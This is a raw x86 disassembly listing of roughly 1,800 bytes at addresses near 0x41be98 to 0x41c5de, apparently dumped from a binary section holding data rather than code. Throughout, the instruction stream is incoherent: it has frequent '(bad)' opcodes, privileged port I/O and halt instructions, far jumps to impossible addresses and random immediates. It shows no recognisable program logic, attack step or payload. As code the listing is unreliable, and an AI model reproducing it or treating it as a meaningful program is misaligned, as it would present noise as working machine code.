  41be98:	or     DWORD PTR ss:[ebp-0x1a],ebp
  41be9c:	dec    edi
  41be9d:	sbb    esi,ebp
  41be9f:	dec    ebx
  41bea0:	pop    esi
  41bea1:	push   ds
  41bea2:	mov    edx,0x9e9e223e
  41bea7:	loop   0x41bf0d
  41bea9:	js     0x41bf01
  41beab:	add    al,0x20
  41bead:	cs dec ecx
  41beaf:	jnp    0x41be7b
  41beb1:	sbb    ebp,DWORD PTR [edx+0x1a]
  41beb4:	push   esp
  41beb5:	mov    ch,0x93
  41beb7:	imul   ebp,DWORD PTR [ebx],0xa4df64f3
  41bebd:	in     eax,0xe3
  41bebf:	sbb    BYTE PTR [ecx+0x5582b945],cl
  41bec5:	push   0x2e
  41bec7:	inc    edi
  41bec8:	add    bh,BYTE PTR [ebp+ebx*1-0x73]
  41becc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41becd:	dec    edi
  41bece:	fmul   QWORD PTR [edx-0x13]
  41bed1:	aaa    
  41bed2:	mov    edx,0x13d766fa
  41bed7:	inc    eax
  41bed8:	sahf   
  41bed9:	jmp    0xf602c3f6
  41bede:	ret    0x5d0e
  41bee1:	push   edi
  41bee2:	in     al,0x59
  41bee4:	adc    eax,0x833a94d7
  41bee9:	ins    DWORD PTR es:[edi],dx
  41beea:	(bad)  
  41beeb:	and    al,0x34
  41beed:	imul   ebx,DWORD PTR [edx-0x3a],0x5b5be4a1
  41bef4:	pushw  cs
  41bef6:	mov    esp,0x8cdd2d56
  41befb:	out    0x28,eax
  41befd:	mov    al,ds:0xf909043f
  41bf02:	mov    es,esp
  41bf04:	sbb    esp,DWORD PTR [edi+0x14]
  41bf07:	cmp    edx,eax
  41bf09:	sub    al,0xb2
  41bf0b:	and    esp,esp
  41bf0d:	sbb    edi,DWORD PTR [edi-0x70cb75c3]
  41bf13:	add    eax,0x51cce724
  41bf18:	lds    esi,FWORD PTR [ecx]
  41bf1a:	mov    ah,0xdd
  41bf1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf1d:	add    al,0x56
  41bf1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf20:	mov    al,0x8a
  41bf22:	scas   eax,DWORD PTR es:[edi]
  41bf23:	xchg   ebx,eax
  41bf24:	pop    edx
  41bf25:	ror    BYTE PTR [ebp-0x164cb1bf],0x44
  41bf2c:	nop
  41bf2d:	add    eax,0xf9f4adc9
  41bf32:	push   eax
  41bf33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf34:	fbld   TBYTE PTR [eax+0x6d]
  41bf37:	les    ebx,FWORD PTR [edx-0x589c64f]
  41bf3d:	hlt    
  41bf3e:	clc    
  41bf3f:	push   eax
  41bf40:	xor    eax,0x20b1ed8c
  41bf45:	nop
  41bf46:	or     al,0x72
  41bf48:	jae    0x41bf13
  41bf4a:	lods   eax,DWORD PTR ds:[esi]
  41bf4b:	or     DWORD PTR [esi-0x48],edx
  41bf4e:	imul   ecx,DWORD PTR [edx+0x20aa3533],0x44
  41bf55:	rcr    BYTE PTR [esi-0x59ad5c21],1
  41bf5b:	stc    
  41bf5c:	mov    eax,0xf40ac92
  41bf61:	loope  0x41bfb1
  41bf63:	das    
  41bf64:	clc    
  41bf65:	shl    DWORD PTR [eax-0x11],cl
  41bf68:	mov    ch,0xa6
  41bf6a:	aad    0x95
  41bf6c:	cli    
  41bf6d:	repnz lea edx,[esi-0x3c58f122]
  41bf74:	fwait
  41bf75:	pop    eax
  41bf76:	xor    eax,DWORD PTR [edi+0x12]
  41bf79:	dec    esp
  41bf7a:	and    ch,ch
  41bf7c:	adc    esi,DWORD PTR [edi]
  41bf7e:	push   es
  41bf7f:	mov    edx,0xc8091e56
  41bf84:	sub    BYTE PTR [ebp+eax*8-0x4b2fd0d9],al
  41bf8b:	push   ss
  41bf8c:	rcl    DWORD PTR [ebp+0x29],1
  41bf8f:	pop    esi
  41bf90:	ret    
  41bf91:	pop    es
  41bf92:	mov    cl,0x61
  41bf94:	and    BYTE PTR [ecx],dl
  41bf96:	mov    ah,BYTE PTR [ebx*1-0x11c99b92]
  41bf9d:	rcl    DWORD PTR [edi],cl
  41bf9f:	retf   0x6b8c
  41bfa2:	and    DWORD PTR [ecx],edi
  41bfa4:	adc    BYTE PTR [ebp+0x73],ch
  41bfa7:	adc    eax,0xce940a7d
  41bfac:	dec    esi
  41bfad:	sbb    edi,DWORD PTR [eax-0x5]
  41bfb0:	inc    ebx
  41bfb1:	repz mov al,0x74
  41bfb4:	jp     0x41bf55
  41bfb6:	rcr    ebp,1
  41bfb8:	and    DWORD PTR [esi],esi
  41bfba:	repz sub DWORD PTR [ebx],eax
  41bfbd:	in     al,0xcf
  41bfbf:	sub    BYTE PTR [edi+0x6836479c],ch
  41bfc5:	rcr    ah,1
  41bfc7:	cmc    
  41bfc8:	xchg   edi,eax
  41bfc9:	and    eax,0x56874e2c
  41bfce:	outs   dx,BYTE PTR ds:[esi]
  41bfcf:	lods   al,BYTE PTR ds:[esi]
  41bfd0:	in     al,dx
  41bfd1:	mov    edx,0x1ae9724
  41bfd6:	pop    ebx
  41bfd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfd8:	adc    al,0xcf
  41bfda:	xor    eax,0x39b651b0
  41bfdf:	push   esp
  41bfe0:	retf   
  41bfe1:	lock or eax,0xfc3b8e27
  41bfe7:	scas   eax,DWORD PTR es:[edi]
  41bfe8:	add    bh,BYTE PTR [eax-0x17]
  41bfeb:	sub    al,0x74
  41bfed:	ins    DWORD PTR es:[edi],dx
  41bfee:	stos   BYTE PTR es:[edi],al
  41bfef:	fstp   st(0)
  41bff1:	xchg   ebp,eax
  41bff2:	inc    esi
  41bff3:	mov    ds:0x3b92702d,eax
  41bff8:	cmp    eax,0xe52fbfde
  41bffd:	jnp    0x41c031
  41bfff:	out    0x15,al
  41c001:	mul    BYTE PTR [ebp-0x95c6717]
  41c007:	fldenv [esi+0x5849f2be]
  41c00d:	jae    0x41bfdf
  41c00f:	xchg   edi,eax
  41c010:	outs   dx,BYTE PTR ds:[esi]
  41c011:	mov    ebp,DWORD PTR [ecx-0x6c3f40de]
  41c017:	and    edx,DWORD PTR [eax]
  41c019:	cs jle 0x41c027
  41c01c:	pop    ecx
  41c01d:	pushf  
  41c01e:	loope  0x41c044
  41c020:	jle    0x41bfbf
  41c022:	mov    ds:0xf94491ee,al
  41c027:	push   ebp
  41c028:	dec    edi
  41c029:	pop    ebx
  41c02a:	rcl    DWORD PTR ds:0xc3eb1c01,0x82
  41c031:	sub    BYTE PTR [ebx+0x27],ah
  41c034:	retf   
  41c035:	xchg   esp,eax
  41c036:	jl     0x41bfed
  41c038:	test   DWORD PTR ds:0x1d2defe9,ebp
  41c03e:	ror    BYTE PTR [edi+0xf87fc2],1
  41c044:	add    al,0xea
  41c046:	cs leave 
  41c048:	push   ecx
  41c049:	dec    edi
  41c04a:	es out dx,al
  41c04c:	loop   0x41c006
  41c04e:	icebp  
  41c04f:	mov    ah,0x58
  41c051:	cwde   
  41c052:	loope  0x41c017
  41c054:	int    0x84
  41c056:	sub    edx,edi
  41c058:	jo     0x41c04e
  41c05a:	fbstp  TBYTE PTR [ebx]
  41c05c:	sahf   
  41c05d:	icebp  
  41c05e:	fbld   TBYTE PTR [edi-0x29]
  41c061:	imul   ecx,eax,0x50
  41c064:	mov    cl,0xdc
  41c066:	jg     0x41c0b1
  41c068:	lahf   
  41c069:	or     ecx,eax
  41c06b:	jo     0x41c0e9
  41c06d:	sbb    eax,DWORD PTR [ecx]
  41c06f:	push   ebx
  41c070:	sbb    al,0x44
  41c072:	cmp    eax,0x7a89dd18
  41c077:	or     DWORD PTR [eax-0x4a],0x58
  41c07b:	int    0xce
  41c07d:	push   ebp
  41c07e:	arpl   WORD PTR [ebx],cx
  41c080:	sub    eax,0x74b65695
  41c085:	xor    al,0xf0
  41c087:	cmp    eax,0xddb4e1b4
  41c08c:	xchg   edx,eax
  41c08d:	cli    
  41c08e:	rcr    esi,0x94
  41c091:	adc    al,0xa1
  41c093:	pop    esi
  41c094:	jle    0x41c094
  41c096:	test   eax,0x24f7e898
  41c09b:	not    DWORD PTR [edx-0x2d]
  41c09e:	inc    esp
  41c09f:	adc    DWORD PTR [edx],esi
  41c0a1:	shr    BYTE PTR [ebx+eax*4],1
  41c0a4:	(bad)  
  41c0a5:	mov    bl,0x94
  41c0a7:	push   edx
  41c0a8:	pop    ds
  41c0a9:	repnz dec esp
  41c0ab:	xchg   esp,eax
  41c0ac:	addr16 das 
  41c0ae:	mov    esi,0x450a564a
  41c0b3:	call   0xa38a2cc5
  41c0b8:	inc    esp
  41c0b9:	adc    DWORD PTR [edx+0x6d],ebx
  41c0bc:	cmp    eax,0xa4d315c1
  41c0c1:	outs   dx,BYTE PTR ds:[esi]
  41c0c2:	call   0xce4be467
  41c0c7:	out    0x36,eax
  41c0c9:	xor    cl,BYTE PTR [esi+0x6aa1e89d]
  41c0cf:	pop    ebp
  41c0d0:	inc    esp
  41c0d1:	ja     0x41c060
  41c0d3:	push   esi
  41c0d4:	sub    ch,0x17
  41c0d7:	pop    ss
  41c0d8:	ficomp DWORD PTR [ebx]
  41c0da:	push   ebp
  41c0db:	test   BYTE PTR [ecx+0x40225b16],dl
  41c0e1:	mov    ebx,0xe33808fa
  41c0e6:	stos   DWORD PTR es:[edi],eax
  41c0e7:	out    0x69,eax
  41c0e9:	in     al,0xf3
  41c0eb:	les    eax,FWORD PTR [ebx]
  41c0ed:	iret   
  41c0ee:	cmp    BYTE PTR [ebx+ecx*8+0x4],0x10
  41c0f3:	dec    esp
  41c0f4:	or     eax,esi
  41c0f6:	mov    esp,0x2e05b159
  41c0fb:	sub    BYTE PTR [edi-0x16c17d83],ch
  41c101:	loopne 0x41c145
  41c103:	lods   al,BYTE PTR ds:[esi]
  41c104:	cld    
  41c105:	loope  0x41c161
  41c107:	dec    ebp
  41c108:	xor    al,0xd7
  41c10a:	sti    
  41c10b:	and    eax,0x86080780
  41c110:	push   es
  41c111:	or     esp,DWORD PTR [edi-0x5d]
  41c114:	ins    DWORD PTR es:[edi],dx
  41c115:	in     al,dx
  41c116:	dec    ecx
  41c117:	xchg   esp,eax
  41c118:	arpl   WORD PTR [edi-0x76e61053],cx
  41c11e:	rcr    DWORD PTR [edi],1
  41c120:	(bad)  
  41c122:	mov    bh,0x58
  41c124:	push   ecx
  41c125:	nop
  41c126:	fs loop 0x41c175
  41c129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c12a:	mov    esp,0x83656c94
  41c12f:	ficomp DWORD PTR [esi-0x5f]
  41c132:	sub    DWORD PTR [edx+0x2c],0xffffff93
  41c136:	ds clc 
  41c138:	xor    DWORD PTR [esi+esi*1-0xa],eax
  41c13c:	sub    BYTE PTR [edx],al
  41c13e:	(bad)  
  41c13f:	sub    eax,0xdc98b938
  41c144:	enter  0xec00,0x6f
  41c148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c149:	pop    edx
  41c14a:	cmp    edx,DWORD PTR [eax]
  41c14c:	and    BYTE PTR [edx-0x1d8135e1],bl
  41c152:	lods   al,BYTE PTR ds:[esi]
  41c153:	mov    edi,0x9721af80
  41c158:	dec    ebp
  41c159:	pop    es
  41c15a:	lahf   
  41c15b:	cmc    
  41c15c:	xchg   ebp,eax
  41c15d:	stos   DWORD PTR es:[edi],eax
  41c15e:	mov    ebp,0xbda9505d
  41c163:	dec    ecx
  41c164:	loop   0x41c19e
  41c166:	call   0x6d82136b
  41c16b:	or     ebx,esi
  41c16d:	icebp  
  41c16e:	mov    ds:0xf9452e3e,eax
  41c173:	ss mul ebp
  41c176:	mov    edi,0xf49f048a
  41c17b:	push   edi
  41c17c:	outs   dx,BYTE PTR ds:[esi]
  41c17d:	cdq    
  41c17e:	jecxz  0x41c116
  41c180:	ret    0x89dd
  41c183:	repnz jecxz 0x41c1f2
  41c186:	xchg   ecx,eax
  41c187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c188:	add    dh,dl
  41c18a:	iret   
  41c18b:	add    ebx,0x14b81955
  41c191:	sub    al,0x44
  41c193:	pop    es
  41c194:	out    0x76,eax
  41c196:	stos   DWORD PTR es:[edi],eax
  41c197:	jge    0x41c1bb
  41c199:	cwde   
  41c19a:	pop    ds
  41c19b:	xchg   DWORD PTR [ecx+0x4af38e9a],ecx
  41c1a1:	dec    edi
  41c1a2:	fist   DWORD PTR [edi-0x68]
  41c1a5:	shl    eax,cl
  41c1a7:	xor    DWORD PTR [esi],edi
  41c1a9:	cld    
  41c1aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1ab:	mov    cl,BYTE PTR [edx+ebp*4-0x27da0952]
  41c1b2:	(bad)  
  41c1b3:	aaa    
  41c1b4:	dec    esp
  41c1b5:	pop    edx
  41c1b6:	xchg   DWORD PTR [ebx+eax*1-0x5f],edi
  41c1ba:	and    edi,edi
  41c1bc:	pop    ebp
  41c1bd:	test   eax,0xfe2b449e
  41c1c2:	jns    0x41c1fc
  41c1c4:	ins    BYTE PTR es:[edi],dx
  41c1c5:	(bad)  
  41c1c6:	adc    edx,DWORD PTR [eax]
  41c1c8:	fwait
  41c1c9:	(bad)  
  41c1ca:	int3   
  41c1cb:	stos   BYTE PTR es:[edi],al
  41c1cc:	mov    edx,ecx
  41c1ce:	jno    0x41c1bd
  41c1d0:	outs   dx,BYTE PTR ds:[esi]
  41c1d1:	jbe    0x41c15a
  41c1d3:	dec    eax
  41c1d4:	mov    ds:0x1d43c0c1,eax
  41c1d9:	adc    esp,DWORD PTR [edx*4-0x35b6919e]
  41c1e0:	pop    ds
  41c1e1:	hlt    
  41c1e2:	outs   dx,BYTE PTR ds:[esi]
  41c1e3:	and    bh,dh
  41c1e5:	mov    al,0x95
  41c1e7:	jne    0x41c1b4
  41c1e9:	arpl   WORD PTR [esi-0x4b73b6e1],sp
  41c1ef:	into   
  41c1f0:	sti    
  41c1f1:	dec    eax
  41c1f2:	and    eax,0xa836be91
  41c1f7:	cdq    
  41c1f8:	jae    0x41c1a0
  41c1fa:	cbw    
  41c1fc:	fwait
  41c1fd:	arpl   WORD PTR [esi+0x0],ax
  41c200:	add    esi,DWORD PTR [ecx-0x202783c1]
  41c206:	das    
  41c207:	xchg   BYTE PTR [eax],dl
  41c209:	gs mov ah,0x70
  41c20c:	xor    dh,BYTE PTR [edi-0x5d8c6d7f]
  41c212:	sti    
  41c213:	xlat   BYTE PTR ds:[ebx]
  41c214:	push   esi
  41c215:	inc    edi
  41c216:	or     al,0x7e
  41c218:	pop    es
  41c219:	scas   eax,DWORD PTR es:[edi]
  41c21a:	fdiv   DWORD PTR [ebp+eax*2+0x5ce29d64]
  41c221:	loopne 0x41c1cd
  41c223:	inc    esi
  41c224:	mov    ss,ecx
  41c226:	sbb    ebx,DWORD PTR [ebp-0x56126f6b]
  41c22c:	popa   
  41c22d:	add    DWORD PTR [ebx+0x6d082b03],ebp
  41c233:	xchg   DWORD PTR [edi+0x1c3c32a2],ecx
  41c239:	ins    BYTE PTR es:[edi],dx
  41c23a:	xchg   BYTE PTR [eax-0x7c],ah
  41c23d:	sbb    eax,0xa72f1084
  41c242:	int    0x8c
  41c244:	int    0xa0
  41c246:	js     0x41c2b7
  41c248:	rcl    ecx,1
  41c24a:	aaa    
  41c24b:	and    DWORD PTR [eax],eax
  41c24d:	inc    ebp
  41c24e:	push   eax
  41c24f:	or     bh,BYTE PTR [ebx+0x6b0cafe8]
  41c255:	dec    edi
  41c256:	loopne 0x41c24c
  41c258:	stos   BYTE PTR es:[edi],al
  41c259:	jb     0x41c25e
  41c25b:	sbb    BYTE PTR [esi-0x3f],dl
  41c25e:	addr16 iret 
  41c260:	push   DWORD PTR [ebx+0x26]
  41c263:	mov    ecx,0xa39a9784
  41c268:	sub    cl,BYTE PTR [eax-0x45]
  41c26b:	pop    esp
  41c26c:	jmp    0x638df831
  41c271:	jnp    0x41c23b
  41c273:	mov    edx,0xb7248f0c
  41c278:	xor    DWORD PTR [ecx-0x5c9826c0],esp
  41c27e:	iret   
  41c27f:	leave  
  41c280:	adc    ebx,DWORD PTR [edx-0x18e6cf0a]
  41c286:	dec    eax
  41c287:	mov    eax,ds:0x4563e122
  41c28c:	mov    ch,0x7a
  41c28e:	sub    al,0x17
  41c290:	pop    ds
  41c291:	or     al,0x97
  41c293:	(bad)  
  41c294:	cld    
  41c295:	cs rcl dl,cl
  41c298:	in     al,0xba
  41c29a:	mov    esi,0xb32585e8
  41c29f:	push   ebp
  41c2a0:	pushf  
  41c2a1:	mov    gs,WORD PTR [ecx]
  41c2a3:	ins    BYTE PTR es:[edi],dx
  41c2a4:	sbb    eax,0xf7a1905e
  41c2a9:	fldcw  WORD PTR [edi-0x5e75d30b]
  41c2af:	push   ebp
  41c2b0:	mov    eax,0x5be7fb7c
  41c2b5:	ja     0x41c259
  41c2b7:	mov    cl,0x81
  41c2b9:	retf   0x1ba5
  41c2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2bd:	sub    BYTE PTR [eiz*8-0x1e5e74f3],bl
  41c2c4:	mov    edx,0x50f8a6ed
  41c2c9:	sub    ecx,DWORD PTR [edx+esi*8+0x8]
  41c2cd:	xor    edx,edx
  41c2cf:	pop    ebx
  41c2d0:	mov    bl,0xcf
  41c2d2:	pop    es
  41c2d3:	loope  0x41c321
  41c2d5:	xchg   esi,eax
  41c2d6:	jae    0x41c2ba
  41c2d8:	mov    ebp,0x544984c5
  41c2dd:	outs   dx,DWORD PTR ds:[esi]
  41c2de:	sahf   
  41c2df:	test   al,0xb2
  41c2e1:	sbb    al,0x94
  41c2e3:	push   0xffffffa6
  41c2e5:	and    eax,0xe7d8772
  41c2ea:	push   esi
  41c2eb:	push   es
  41c2ec:	cld    
  41c2ed:	ret    0xd328
  41c2f0:	mov    ch,0x40
  41c2f2:	cld    
  41c2f3:	mov    eax,0xaf0269e5
  41c2f8:	adc    dh,BYTE PTR [ebp-0x7d]
  41c2fb:	pop    esi
  41c2fc:	aas    
  41c2fd:	test   ecx,ebx
  41c2ff:	les    edi,FWORD PTR [ecx+0x14519502]
  41c305:	inc    eax
  41c306:	(bad)  
  41c307:	sar    BYTE PTR [ecx+0x46],cl
  41c30a:	mov    BYTE PTR [ebx+ebp*4+0x27adbb7],dh
  41c311:	shr    DWORD PTR [eax-0x5],0x9f
  41c315:	add    BYTE PTR [esi-0x5fe5d4f3],dl
  41c31b:	iret   
  41c31c:	cmp    esi,DWORD PTR cs:[ecx+0x220105c8]
  41c323:	inc    esp
  41c324:	sbb    al,0x1d
  41c326:	jg     0x41c310
  41c328:	pop    ecx
  41c329:	sahf   
  41c32a:	and    ebx,edx
  41c32c:	or     ebp,DWORD PTR [edx-0x2cb78bb9]
  41c332:	xor    al,0x18
  41c334:	into   
  41c335:	shl    dh,0xf0
  41c338:	xchg   esp,eax
  41c339:	neg    eax
  41c33b:	into   
  41c33c:	pusha  
  41c33d:	lock inc edx
  41c33f:	jl     0x41c36e
  41c341:	(bad)  
  41c342:	ins    DWORD PTR es:[edi],dx
  41c343:	inc    DWORD PTR [edx+0x2017a4e4]
  41c349:	idiv   DWORD PTR [ecx+0x1d]
  41c34c:	push   ebp
  41c34d:	lods   al,BYTE PTR ds:[esi]
  41c34e:	mov    ebx,0xe874f6f0
  41c353:	add    DWORD PTR [eax+edx*4],ebp
  41c356:	jns    0x41c34c
  41c358:	adc    eax,0xff7fc4b1
  41c35d:	idiv   DWORD PTR ds:[eax+0x41]
  41c361:	jno    0x41c371
  41c363:	and    DWORD PTR [esi],esi
  41c365:	daa    
  41c366:	call   0xed4a:0x2c5eae56
  41c36d:	cmova  ecx,DWORD PTR [eax+0x25]
  41c371:	push   0x9c329c27
  41c376:	sbb    BYTE PTR [edx+0xc504d2f],al
  41c37c:	mov    ch,0x13
  41c37e:	(bad)  
  41c37f:	push   ebp
  41c380:	sahf   
  41c381:	push   0x23
  41c383:	out    dx,eax
  41c384:	xor    bl,BYTE PTR [eax]
  41c386:	sti    
  41c387:	pop    ebx
  41c388:	and    al,0xa6
  41c38a:	cmp    al,0x2c
  41c38c:	leave  
  41c38d:	cmp    BYTE PTR [edx-0x346741c1],bl
  41c393:	imul   ebx
  41c395:	jecxz  0x41c37e
  41c397:	dec    ebx
  41c398:	lock xlat BYTE PTR ds:[ebx]
  41c39a:	sar    cl,cl
  41c39c:	ss lahf 
  41c39e:	cmp    BYTE PTR [eax+esi*2],0x25
  41c3a2:	(bad)  [ecx]
  41c3a4:	cdq    
  41c3a5:	lods   al,BYTE PTR ds:[esi]
  41c3a6:	mov    eax,0x1cff1676
  41c3ab:	retf   0xe60
  41c3ae:	and    ah,al
  41c3b0:	shl    ebx,1
  41c3b2:	jge    0x41c341
  41c3b4:	pop    esp
  41c3b5:	xor    al,0xdf
  41c3b7:	push   edx
  41c3b8:	sub    BYTE PTR [esi+0x15],bh
  41c3bb:	jecxz  0x41c364
  41c3bd:	and    BYTE PTR [edx-0x7],bl
  41c3c0:	inc    ecx
  41c3c1:	pop    esp
  41c3c2:	cli    
  41c3c3:	pop    DWORD PTR [edx]
  41c3c5:	add    al,0x67
  41c3c7:	retf   
  41c3c8:	pop    esp
  41c3c9:	shr    ebx,1
  41c3cb:	dec    ebp
  41c3cc:	outs   dx,DWORD PTR ds:[esi]
  41c3cd:	push   ebx
  41c3ce:	out    0x19,al
  41c3d0:	adc    al,BYTE PTR [edx-0x7f]
  41c3d3:	nop
  41c3d4:	push   0xded1d430
  41c3d9:	fld    TBYTE PTR [edx+0x7e]
  41c3dc:	leave  
  41c3dd:	mov    dh,0xf1
  41c3df:	push   ebp
  41c3e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3e1:	loop   0x41c377
  41c3e3:	xlat   BYTE PTR ds:[ebx]
  41c3e4:	cmp    BYTE PTR [esp+ebx*8],al
  41c3e7:	mov    ah,0x79
  41c3e9:	cmp    BYTE PTR [ebp+0xb],ah
  41c3ec:	sbb    al,0xe7
  41c3ee:	int3   
  41c3ef:	in     al,0xd7
  41c3f1:	mov    edx,0xf0038f0a
  41c3f6:	and    dh,BYTE PTR [ebp-0x338d7850]
  41c3fc:	ins    DWORD PTR es:[edi],dx
  41c3fd:	add    DWORD PTR [ebx],edx
  41c3ff:	(bad)  
  41c401:	pop    esp
  41c402:	jnp    0x41c408
  41c404:	mov    bh,0x8a
  41c406:	into   
  41c407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c408:	inc    ecx
  41c409:	jge    0x41c3df
  41c40b:	sbb    BYTE PTR [edx-0x15],al
  41c40e:	and    al,0x21
  41c410:	(bad)  
  41c412:	inc    ebx
  41c413:	loop   0x41c3e4
  41c415:	sub    BYTE PTR [edi+eax*8],ch
  41c418:	xchg   esi,eax
  41c419:	(bad)  
  41c41a:	cmp    cl,BYTE PTR [ecx]
  41c41c:	inc    eax
  41c41d:	cmp    BYTE PTR [ebx+0x43],dh
  41c420:	(bad)  
  41c422:	cmc    
  41c423:	loope  0x41c46a
  41c425:	mov    ah,ch
  41c427:	pop    edx
  41c428:	fldcw  WORD PTR [edx+eiz*2]
  41c42b:	ins    BYTE PTR es:[edi],dx
  41c42c:	sbb    BYTE PTR [ebp+0x672c89c7],bl
  41c432:	in     eax,0xee
  41c434:	mov    ebp,0x4b3f2c29
  41c439:	xchg   esi,eax
  41c43a:	and    eax,0x77e6f40f
  41c43f:	push   ss
  41c440:	call   0xcaba:0x9b152349
  41c447:	hlt    
  41c448:	in     eax,0xb8
  41c44a:	lods   eax,DWORD PTR ds:[esi]
  41c44b:	mov    ds:0xc143d99a,al
  41c450:	sbb    edi,0xdcff49c9
  41c456:	nop
  41c457:	ret    0xa9ed
  41c45a:	push   ds
  41c45b:	jl     0x41c473
  41c45d:	inc    esp
  41c45e:	or     al,0x9
  41c460:	cmp    al,0xea
  41c462:	sbb    eax,0x5fb449c8
  41c467:	cld    
  41c468:	dec    eax
  41c469:	mov    al,0x47
  41c46b:	sub    bh,BYTE PTR [ebp-0x6bd75989]
  41c471:	fisub  DWORD PTR [ebp-0x39bb5d14]
  41c477:	or     ecx,DWORD PTR [edi+0x333854bb]
  41c47d:	ins    BYTE PTR es:[edi],dx
  41c47e:	inc    edx
  41c47f:	or     eax,0xb46e24db
  41c484:	cs ins BYTE PTR es:[edi],dx
  41c486:	(bad)  
  41c487:	gs int 0xe3
  41c48a:	daa    
  41c48b:	add    al,0xf1
  41c48d:	test   DWORD PTR [esi-0x45353727],edi
  41c493:	test   al,0xa4
  41c495:	mov    edi,edi
  41c497:	xchg   ebx,eax
  41c498:	ret    
  41c499:	loop   0x41c458
  41c49b:	mov    ds:0xb81d6eb3,al
  41c4a0:	js     0x41c504
  41c4a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4a3:	enter  0xf19d,0x66
  41c4a7:	pusha  
  41c4a8:	mov    ch,0xa9
  41c4aa:	jb     0x41c4c9
  41c4ac:	xor    eax,DWORD PTR [ebx]
  41c4ae:	stc    
  41c4af:	pcmpgtw mm7,mm2
  41c4b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4b3:	jmp    DWORD PTR [edx]
  41c4b5:	adc    cl,bh
  41c4b7:	stos   BYTE PTR es:[edi],al
  41c4b8:	fwait
  41c4b9:	lods   eax,DWORD PTR ds:[esi]
  41c4ba:	push   edx
  41c4bb:	or     eax,0x7f76346b
  41c4c0:	cmp    BYTE PTR [ebx],bh
  41c4c2:	ud1    eax,DWORD PTR [ecx+0x5c]
  41c4c6:	jecxz  0x41c51d
  41c4c8:	das    
  41c4c9:	ret    
  41c4ca:	mov    esp,0xab8ce3be
  41c4cf:	adc    ebx,DWORD PTR [esi+edi*8+0x11]
  41c4d3:	rol    BYTE PTR [edi+0x493bcc7f],1
  41c4d9:	mov    DWORD PTR [ecx],ebp
  41c4db:	jbe    0x41c542
  41c4dd:	add    BYTE PTR [edx+0x179ebe19],0x95
  41c4e4:	ret    
  41c4e5:	imul   edi,DWORD PTR [edx+0x2f],0x34187b89
  41c4ec:	add    esi,0x3bc63ec9
  41c4f2:	and    bl,BYTE PTR [ebp+0x18703e5c]
  41c4f8:	mov    dh,0xa7
  41c4fa:	mov    eax,ds:0xeb761a6
  41c4ff:	inc    edi
  41c500:	pop    esi
  41c501:	push   0xa371f580
  41c506:	jmp    0xc7fb4515
  41c50b:	and    bh,BYTE PTR [edx-0x49dfad53]
  41c511:	jmp    0xfc57fb87
  41c516:	scas   eax,DWORD PTR es:[edi]
  41c517:	pop    ebp
  41c518:	mov    ebp,DWORD PTR [ebx+0x13]
  41c51b:	mov    ebx,ebp
  41c51d:	(bad)  
  41c51e:	sbb    ebx,DWORD PTR [eax-0x47]
  41c521:	mov    bl,0x10
  41c523:	sbb    al,0xf0
  41c525:	fsubr  DWORD PTR [ebx+0x2105997c]
  41c52b:	pushf  
  41c52c:	adc    BYTE PTR ds:0xb82ff8e5,dl
  41c532:	sbb    al,0x78
  41c534:	aam    0x3e
  41c536:	adc    DWORD PTR [edi+0x209371e8],ecx
  41c53c:	imul   ebp,DWORD PTR [edi-0x65],0xfffffff6
  41c540:	jae    0x41c587
  41c542:	cli    
  41c543:	popf   
  41c544:	push   ecx
  41c545:	rcl    DWORD PTR [eax-0x69],1
  41c548:	and    ebx,DWORD PTR [ecx+0x1b3dad50]
  41c54e:	mov    edi,0x6d5ea2e8
  41c553:	aaa    
  41c554:	sub    edx,DWORD PTR [eax+0x14]
  41c557:	mov    edi,0x82bc9148
  41c55c:	mov    eax,0x14865e5a
  41c561:	adc    al,0xd2
  41c563:	sbb    eax,esi
  41c565:	xchg   ebp,eax
  41c566:	xchg   BYTE PTR [ecx+esi*1-0xad2060c],ch
  41c56d:	adc    esi,DWORD PTR [ebp-0x52aa0835]
  41c573:	fstp   DWORD PTR [ebp-0x72ad357a]
  41c579:	dec    eax
  41c57a:	ins    DWORD PTR es:[edi],dx
  41c57b:	test   eax,0xce8b4199
  41c580:	mov    ch,0x40
  41c582:	push   ecx
  41c583:	pop    esi
  41c584:	iret   
  41c585:	outs   dx,DWORD PTR ds:[esi]
  41c586:	mov    ds:0x5c2ee5c4,al
  41c58b:	xchg   ecx,eax
  41c58c:	aad    0x34
  41c58e:	inc    edi
  41c58f:	push   esp
  41c590:	fwait
  41c591:	lds    ebx,FWORD PTR [ecx-0x21]
  41c594:	fwait
  41c595:	icebp  
  41c596:	ficom  DWORD PTR [edx+0x2966d098]
  41c59c:	aam    0x5b
  41c59e:	inc    edx
  41c59f:	hlt    
  41c5a0:	retf   
  41c5a1:	call   0xa3d7:0xa8c35bdb
  41c5a8:	mov    ds:0xcb0e0e8e,eax
  41c5ad:	inc    ecx
  41c5ae:	mov    al,dh
  41c5b0:	dec    esp
  41c5b1:	pop    ebx
  41c5b2:	test   esi,eax
  41c5b4:	mov    edi,0x7329bc80
  41c5b9:	dec    esp
  41c5ba:	aaa    
  41c5bb:	push   cs
  41c5bc:	push   esp
  41c5bd:	stos   BYTE PTR es:[edi],al
  41c5be:	add    al,0x6f
  41c5c0:	adc    ah,bh
  41c5c2:	ret    0xd407
  41c5c5:	xchg   BYTE PTR [eax],dl
  41c5c7:	pop    ebp
  41c5c8:	jns    0x41c643
  41c5ca:	mov    DWORD PTR [eax-0x76f224c],ebx
  41c5d0:	xchg   BYTE PTR [edx],bl
  41c5d2:	popf   
  41c5d3:	or     al,0x7d
  41c5d5:	mov    cl,0x78
  41c5d7:	xor    edx,DWORD PTR [eax]
  41c5d9:	mov    ebp,0xfd0763ab
  41c5de:	jmp    0x48f1:0x545410f7
